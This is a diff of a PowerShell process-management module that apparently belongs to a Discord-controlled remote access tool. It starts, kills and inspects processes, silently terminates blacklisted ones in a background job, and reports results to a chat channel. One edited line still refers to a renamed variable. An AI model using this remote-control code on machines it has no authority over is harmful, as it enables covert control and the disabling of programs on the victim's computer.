@@ -7,8 +7,8 @@ if (-not $global:ProcessBlacklist) {
 if (-not $global:ProcessMonitoringEnabled) { $global:ProcessMonitoringEnabled = $false }
 if (-not $global:ProcessMonitorJob) { $global:ProcessMonitorJob = $null }
 
-$global:ProcessChannelName = "process-management"
-Get_OrCreateChannel -channelName $global:ProcessChannelName
+$global:process_management_channel_name = "process-management"
+Get_OrCreateChannel -channelName $global:process_management_channel_name
 
 #==================================== PERSISTENCE FUNCTIONS ====================================
 
@@ -19,7 +19,7 @@ function MSave_ProcessLists {
         LastSaved = Get-Date
     }
     $data | ConvertTo-Json | Out-File -FilePath $dataPath -Encoding UTF8
-    sendEmbedWithImage -Title "Process Management" -Description ":floppy_disk: **Process blacklist saved**" -ChannelTarget $global:ProcessChannelName
+    sendEmbedWithImage -Title "Process Management - BLACKLIST" -Description ":floppy_disk: **Process blacklist saved**" -ChannelTarget $global:process_management_channel_name
 }
 
 function MLoad_ProcessLists {
@@ -27,9 +27,9 @@ function MLoad_ProcessLists {
     if (Test-Path $dataPath) {
         $data = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
         $global:ProcessBlacklist = $data.Blacklist
-        sendEmbedWithImage -Title "Process Management" -Description ":open_file_folder: **Process blacklist loaded**`n`n**Blacklist items:** $($global:ProcessBlacklist.Count)" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "Process Management - BLACKLIST" -Description ":open_file_folder: **Process blacklist loaded**`n`n**Blacklist items:** $($global:ProcessBlacklist.Count)" -ChannelTarget $global:process_management_channel_name
     } else {
-        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No saved data found**" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No saved data found**" -ChannelTarget $global:process_management_channel_name
     }
 }
 
@@ -78,7 +78,7 @@ function MGet_ProcessList {
     }
     $output += "``````"
     
-    sendMsg -Message $output -ChannelTarget $global:ProcessChannelName
+    sendMsg -Message $output -ChannelTarget $global:process_management_channel_name
 }
 
 #==================================== PROCESS EXECUTION ====================================
@@ -97,14 +97,14 @@ function MStart_Process {
     }
     
     if (-not (Test-Path $executablePath)) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** $executablePath" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** $executablePath" -Color "13369344" -ChannelTarget $global:process_management_channel_name
         return
     }
     
     # Check if process is in blacklist
     $fileName = [System.IO.Path]::GetFileNameWithoutExtension($executablePath)
     if ($global:ProcessBlacklist -contains $fileName) {
-        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Cannot start blacklisted process:** $fileName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":no_entry: **Cannot start blacklisted process:** $fileName" -ChannelTarget $global:process_management_channel_name
         return
     }
     
@@ -127,9 +127,9 @@ function MStart_Process {
     $process = [System.Diagnostics.Process]::Start($startInfo)
     
     if ($process) {
-        sendEmbedWithImage -Title "Process Management" -Description ":rocket: **Started process:** $fileName (PID: $($process.Id))" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":rocket: **Started process:** $fileName (PID: $($process.Id))" -ChannelTarget $global:process_management_channel_name
     } else {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to start process:** $fileName" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to start process:** $fileName" -Color "13369344" -ChannelTarget $global:process_management_channel_name
     }
 }
 
@@ -139,7 +139,7 @@ function MAdd_ProcessBlacklist {
     param([string]$processName)
     
     if (-not $processName) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``ADDBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``ADDBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
         return
     }
     
@@ -152,15 +152,15 @@ function MAdd_ProcessBlacklist {
     }
     
     if ($global:ProcessBlacklist -notcontains $processName) {
-        sendEmbedWithImage -Title "Process Management" -Description ":hourglass_flowing_sand: **Adding to blacklist:** $processName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":hourglass_flowing_sand: **Adding to blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
         
         # Use array concatenation instead of += to avoid op_Addition issues
         $global:ProcessBlacklist = $global:ProcessBlacklist + @($processName)
         
         MSave_ProcessLists
-        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Added to blacklist:** $processName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":no_entry: **Added to blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
     } else {
-        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Already in blacklist:** $processName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":information_source: **Already in blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
     }
 }
 # Remove Before process monitoring, as it wont update live ( remove -> stop -> start again)
@@ -168,26 +168,26 @@ function MRemove_ProcessBlacklist {
     param([string]$processName)
     
     if (-not $processName) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
         return
     }
     
     if ($global:ProcessBlacklist -contains $processName) {
         $global:ProcessBlacklist = $global:ProcessBlacklist | Where-Object { $_ -ne $processName }
         MSave_ProcessLists
-        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Removed from blacklist:** $processName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Removed from blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
     } else {
-        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Not in blacklist:** $processName" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Not in blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
     }
 }
 # works
 function MShow_ProcessBlacklist {
     if ($global:ProcessBlacklist.Count -eq 0) {
-        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Process Blacklist:** Empty" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":no_entry: **Process Blacklist:** Empty" -ChannelTarget $global:process_management_channel_name
     } else {
         $message = ":no_entry: **Process Blacklist:** ($($global:ProcessBlacklist.Count) items)`n"
         $global:ProcessBlacklist | ForEach-Object { $message += "Process: $_`n" }
-        sendEmbedWithImage -Title "Process Management" -Description $message -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description $message -ChannelTarget $global:process_management_channel_name
     }
 }
 
@@ -197,19 +197,19 @@ function MStart_ProcessMonitoring {
     param([int]$intervalSeconds = 5)
     
     if ($global:ProcessMonitoringEnabled) {
-        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is already running**" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is already running**" -ChannelTarget $global:process_management_channel_name
         return
     }
     
     if ($global:ProcessBlacklist.Count -eq 0) {
-        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No processes in blacklist.** Add some first with ``ADDBLACKLIST``" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No processes in blacklist.** Add some first with ``ADDBLACKLIST``" -ChannelTarget $global:process_management_channel_name
         return
     }
     
     $global:ProcessMonitoringEnabled = $true
-    
-    sendEmbedWithImage -Title "Process Management" -Description ":hourglass_flowing_sand: **Starting process monitoring...**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:ProcessChannelName
-    sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Monitoring blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:ProcessChannelName
+
+    sendEmbedWithImage -Title "Process Management" -Description ":hourglass_flowing_sand: **Starting process monitoring...**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:process_management_channel_name
+    sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Monitoring blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:process_management_channel_name
 
     $global:ProcessMonitorJob = Start-Job -ScriptBlock {
         param($token, $SessionID, $intervalSeconds, $blacklist, $ProcessChannelName, $ChannelRegistry)
@@ -273,18 +273,18 @@ function MStart_ProcessMonitoring {
             Start-Sleep -Seconds $intervalSeconds
         }
         
-    } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessBlacklist, $global:ProcessChannelName, $global:ChannelRegistry
+    } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessBlacklist, $global:process_management_channel_name, $global:ChannelRegistry
     
     # Wait for job to initialize
     Start-Sleep -Seconds 1
     
-    sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process monitoring started**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:ProcessChannelName
+    sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process monitoring started**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:process_management_channel_name
 }
 
 # works
 function MStop_ProcessMonitoring {
     if (-not $global:ProcessMonitoringEnabled) {
-        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is not running**" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":information_source: **Process monitoring is not running**" -ChannelTarget $global:process_management_channel_name
         return
     }
     
@@ -296,20 +296,20 @@ function MStop_ProcessMonitoring {
         $global:ProcessMonitorJob = $null
     }
     
-    sendEmbedWithImage -Title "Process Management" -Description ":stop_sign: **Process monitoring stopped**" -ChannelTarget $global:ProcessChannelName
+    sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":stop_sign: **Process monitoring stopped**" -ChannelTarget $global:process_management_channel_name
 }
 
 function MGet_ProcessMonitoringStatus {
     if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
         $job = $global:ProcessMonitorJob
         if ($job.State -eq "Running") {
-            sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id)) - Silent mode" -ChannelTarget $global:ProcessChannelName
-            sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:ProcessChannelName
+            sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id)) - Silent mode" -ChannelTarget $global:process_management_channel_name
+            sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:process_management_channel_name
         } else {
-            sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))" -ChannelTarget $global:ProcessChannelName
+            sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))" -ChannelTarget $global:process_management_channel_name
         }
     } else {
-        sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process Monitoring Status:** Stopped" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Stopped" -ChannelTarget $global:process_management_channel_name
     }
 }
 
@@ -318,8 +318,7 @@ function MGet_ProcessMonitoringStatus {
 function MGet_ProcessDetails {
     param(
         [string]$processName = "",
-        [int]$processId = 0,
-        [switch]$showAll  # New parameter to show details for all instances
+        [int]$processId = 0
     )
     
     if (-not $processName -and $processId -eq 0) {
@@ -327,124 +326,46 @@ function MGet_ProcessDetails {
         return
     }
     
-    $processes = @()
+    $process = $null
     
     if ($processId -ne 0) {
-        $processes = @(Get-Process -Id $processId -ErrorAction SilentlyContinue)
+        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
     } else {
-        $processes = @(Get-Process -Name $processName -ErrorAction SilentlyContinue)
-    }
-    
-    if (-not $processes -or $processes.Count -eq 0) {
-        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:ProcessChannelName
-        return
-    }
-    
-    # Handle multiple processes
-    if ($processes.Count -gt 1 -and -not $showAll) {
-        $message = ":information_source: **Multiple processes found for '$processName' ($($processes.Count) instances):**`n`n"
-        
-        # Show a detailed list with more info to help user choose
-        foreach ($proc in $processes) {
-            try {
-                $memoryMB = [math]::Round($proc.WorkingSet / 1MB, 2)
-                $cpuTime = if ($proc.CPU) { [math]::Round($proc.CPU, 2) } else { "0" }
-                $startTime = if ($proc.StartTime) { $proc.StartTime.ToString("HH:mm:ss") } else { "N/A" }
-                
-                $message += "**PID $($proc.Id):** Memory: ${memoryMB}MB, CPU: ${cpuTime}s, Started: $startTime`n"
-            } catch {
-                $message += "**PID $($proc.Id):** Unable to get details`n"
-            }
-        }
-        
-        $message += "`n**Options:**`n"
-        $message += "• Use ``PROCESSDETAILS -processId <PID>`` for specific process`n"
-        $message += "• Use ``PROCESSDETAILS -processName $processName -showAll`` for all instances"
-        
-        sendEmbedWithImage -Title "Process Management" -Description $message -ChannelTarget $global:ProcessChannelName
-        return
-    }
-    
-    # Show details for all processes (either single process or showAll flag)
-    foreach ($process in $processes) {
-        try {
-            $memoryMB = [math]::Round($process.WorkingSet / 1MB, 2)
-            $cpuTime = if ($process.CPU) { [math]::Round($process.CPU, 2) } else { "N/A" }
-            $startTime = if ($process.StartTime) { $process.StartTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
-            
-            $details = ":gear: **Process Details" + $(if ($processes.Count -gt 1) { " (PID: $($process.Id))" } else { "" }) + ":**`n`n"
-            $details += "**Name:** $($process.ProcessName)`n"
-            $details += "**PID:** $($process.Id)`n"
-            $details += "**Memory:** ${memoryMB} MB`n"
-            $details += "**CPU Time:** $cpuTime seconds`n"
-            $details += "**Start Time:** $startTime`n"
-            $details += "**Responding:** $($process.Responding)`n"
-            
-            # Try to get additional process information with error handling
-            try {
-                if ($process.MainModule) {
-                    $details += "**Path:** $($process.MainModule.FileName)`n"
-                    
-                    # Try to get version info
-                    try {
-                        $versionInfo = $process.MainModule.FileVersionInfo
-                        if ($versionInfo.FileVersion) {
-                            $details += "**Version:** $($versionInfo.FileVersion)`n"
-                        }
-                        if ($versionInfo.ProductName) {
-                            $details += "**Product:** $($versionInfo.ProductName)`n"
-                        }
-                    } catch {
-                        # Version info not accessible - continue silently
-                    }
-                } else {
-                    $details += "**Path:** Access denied or system process`n"
-                }
-            } catch {
-                $details += "**Path:** Unable to access (insufficient permissions)`n"
-            }
-            
-            # Add additional useful information
-            try {
-                $details += "**Threads:** $($process.Threads.Count)`n"
-                $details += "**Handles:** $($process.HandleCount)`n"
-                
-                # Try to get parent process - improved error handling
-                try {
-                    $parentId = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId=$($process.Id)" -ErrorAction SilentlyContinue).ParentProcessId
-                    if ($parentId -and $parentId -ne 0) {
-                        $parentProcess = Get-Process -Id $parentId -ErrorAction SilentlyContinue
-                        if ($parentProcess) {
-                            $details += "**Parent:** $($parentProcess.ProcessName) (PID: $parentId)`n"
-                        } else {
-                            $details += "**Parent:** PID $parentId (process ended)`n"
-                        }
-                    } else {
-                        $details += "**Parent:** System/No parent`n"
-                    }
-                } catch {
-                    # Parent process info not accessible - continue silently
-                    $details += "**Parent:** Unable to determine`n"
-                }
-                
-            } catch {
-            }
-            
-            sendEmbedWithImage -Title "Process Management" -Description $details -ChannelTarget $global:ProcessChannelName
-            
-            if ($processes.Count -gt 1) {
-                Start-Sleep -Milliseconds 500
-            }
-            
-        } catch {
-
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error getting details for PID $($process.Id):** $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
+        if ($processes.Count -gt 1) {
+            $message = ":information_source: **Multiple processes found for '$processName':**`n"
+            $processes | ForEach-Object { $message += "->$($_.ProcessName) (PID: $($_.Id))`n" }
+            $message += "**Use PID for specific process details**"
+            sendEmbedWithImage -Title "Process Management" -Description $message -ChannelTarget $global:ProcessChannelName
+            return
+        } else {
+            $process = $processes | Select-Object -First 1
         }
     }
     
-    if ($processes.Count -gt 1 -and $showAll) {
-        sendEmbedWithImage -Title "Process Management" -Description ":white_check_mark: **Showed details for $($processes.Count) instances of '$processName'**" -ChannelTarget $global:ProcessChannelName
+    if (-not $process) {
+        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:process_management_channel_name
+        return
     }
+    
+    $memoryMB = [math]::Round($process.WorkingSet / 1MB, 2)
+    $cpuTime = if ($process.CPU) { [math]::Round($process.CPU, 2) } else { "N/A" }
+    $startTime = if ($process.StartTime) { $process.StartTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
+    
+    $details = ":gear: **Process Details:**`n"
+    $details += "**Name:** $($process.ProcessName)`n"
+    $details += "**PID:** $($process.Id)`n"
+    $details += "**Memory:** ${memoryMB} MB`n"
+    $details += "**CPU Time:** $cpuTime seconds`n"
+    $details += "**Start Time:** $startTime`n"
+    $details += "**Responding:** $($process.Responding)`n"
+    
+    if ($process.MainModule) {
+        $details += "**Path:** $($process.MainModule.FileName)`n"
+        $details += "**Version:** $($process.MainModule.FileVersionInfo.FileVersion)`n"
+    }
+    
+    sendEmbedWithImage -Title "PROCESS MANAGEMENT - PROCESS DETAILS" -Description $details -ChannelTarget $global:process_management_channel_name
 }
 
 function MKill_Process {
@@ -455,7 +376,7 @@ function MKill_Process {
     )
     
     if (-not $processName -and $processId -eq 0) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``KILLPROCESS -processName notepad`` or ``KILLPROCESS -processId 1234``" -Color "13369344" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``KILLPROCESS -processName notepad`` or ``KILLPROCESS -processId 1234``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
         return
     }
     
@@ -468,7 +389,7 @@ function MKill_Process {
     }
     
     if (-not $processes) {
-        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:ProcessChannelName
+        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:process_management_channel_name
         return
     }
     
@@ -489,14 +410,14 @@ function MKill_Process {
             $killedProcesses += "$($proc.ProcessName) (PID: $($proc.Id))"
             
         } catch {
-            sendEmbedWithImage -Title "Process Management" -Description ":x: **Failed to terminate:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)" -ChannelTarget $global:ProcessChannelName
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to terminate:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:process_management_channel_name
         }
     }
     
     if ($killedProcesses.Count -gt 0) {
         $message = ":skull_crossbones: **Terminated processes:**`n"
-        $killedProcesses | ForEach-Object { $message += "• $_`n" }
-        sendEmbedWithImage -Title "Process Management" -Description $message -ChannelTarget $global:ProcessChannelName
+        $killedProcesses | ForEach-Object { $message += "-> $_`n" }
+        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description $message -ChannelTarget $global:process_management_channel_name
     }
 }
 
@@ -507,6 +428,6 @@ function MProcMon_Cleanup {
     if (Test-Path "$env:TEMP\ProcessManagement_Data.json") {
         Remove-Item "$env:TEMP\ProcessManagement_Data.json" -Force
     }
-    sendEmbedWithImage -Title "Process Management" -Description ":wastebasket: **Cleaned up process management data and stopped monitoring**" -ChannelTarget $global:ProcessChannelName
+    sendEmbedWithImage -Title "PROCESS MANAGEMENT - CLEANUP" -Description ":wastebasket: **Cleaned up process management data and stopped monitoring**" -ChannelTarget $global:process_management_channel_name
 }
 
